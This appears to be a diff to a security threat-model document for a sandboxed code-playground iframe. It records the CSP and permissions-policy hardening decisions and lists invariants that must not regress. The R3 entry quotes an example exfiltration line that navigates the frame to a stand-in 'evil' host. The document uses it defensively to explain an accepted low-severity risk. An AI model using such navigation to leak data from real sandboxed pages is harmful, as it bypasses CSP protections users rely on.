@@ -162,22 +162,29 @@ side, which is backwards for the origin that actually holds the asset.
   distinctness there is a distinct-**port** invariant (`PORT` ≠ `TINKERPAD_CONTENT_PORT`) enforced in
   that same resolver, turning a cryptic second-bind `EADDRINUSE` into a named error before either socket
   binds.
-- **R3 — Content CSP does not block outbound navigation.** `connect-src 'none'` stops fetch/XHR,
-  but a playground can still `location = 'https://evil?…'` (self-frame navigation; sandbox
-  permits it, `navigate-to` is unshipped). Low severity: the opaque frame holds nothing
-  sensitive to exfiltrate, so document + accept. → `tinkerpadai-sandbox-bci.5`
+- **R3 — Content CSP does not block outbound navigation. ✅ DOCUMENTED & ACCEPTED (`tinkerpadai-sandbox-bci.5`).**
+  `connect-src 'none'` stops fetch/XHR, but a playground can still `location = 'https://evil?…'` (self-frame
+  navigation; sandbox permits it, CSP's `navigate-to` is unshipped in browsers). Low severity: the opaque
+  frame holds nothing sensitive to exfiltrate, so a self-navigation carries nothing worth the trip. The
+  decision is document-and-accept, not fix — captured at the CSP definition (`contentHandler.ts`), where a
+  future `navigate-to` would be added if it ships.
 - **R4 — Iframe has no explicit `allow` permissions policy / content origin has no
-  `frame-ancestors`.** The opaque frame is already denied powerful features and third-party
-  embedding is low-risk (opaque + `connect-src 'none'`), but an explicit `allow=""` on the
-  iframe and `frame-ancestors <app-origin>` on the content response make the intent
-  machine-enforced rather than implied. → folded into `tinkerpadai-sandbox-bci.5`
+  `frame-ancestors`. ✅ CLOSED (`tinkerpadai-sandbox-bci.5`).** The player iframe now carries `allow=""`
+  (a deny-all permissions policy — no camera/mic/geolocation/etc. delegated), and every content-origin
+  response carries `frame-ancestors <app-origin>` scoping framing to the app's player alone, so a third
+  party cannot hotlink/embed a playground as their own. Both were already implied (the opaque sandbox
+  denies powerful features; `connect-src 'none'` blunts embedding abuse), so this is defense-in-depth that
+  makes the intent machine-enforced and survives a future sandbox-attribute change. The app origin is not a
+  new config value — it is DERIVED from the OAuth callback URL (`appOriginOf`), the canonical app-origin
+  source (the callback is registered on the app origin by construction). `[LAW:one-source-of-truth]`
 
 ## What would break this model
 
 The invariants a future change must not silently regress (each has a red test):
 
 1. The player iframe stays `allow-scripts` **without** `allow-same-origin` or any
-   `allow-top-navigation*`. Adding either collapses L2.
+   `allow-top-navigation*`, and keeps its explicit `allow=""` deny-all permissions policy. Adding a
+   dropped sandbox token collapses L2; removing `allow=""` re-opens R4's permissions-policy half.
 2. The content CSP keeps `default-src 'none'` and `connect-src 'none'`.
 3. Free-text metadata (prompt/author) stays escaped at every app-origin callsite, and
    tags stay minted through the `Tag()` brand rather than stored raw (V6).
@@ -193,3 +200,7 @@ The invariants a future change must not silently regress (each has a red test):
    rejects a same-hostname `TINKERPAD_CONTENT_ORIGIN` (`assertDistinctOriginHosts`); Node, where both
    sockets bind the same host, rejects `PORT` == `TINKERPAD_CONTENT_PORT`. Removing either guard
    re-opens R2 (raw playground HTML served where it can reach the app's cookies and session).
+8. Every content-origin response carries `frame-ancestors <app-origin>`, scoping framing to the app's
+   player alone. The app origin is DERIVED from the OAuth callback URL (`appOriginOf`), never a second
+   config value that could drift. Unsetting it (letting any site frame) or widening it re-opens R4's
+   embedding half.
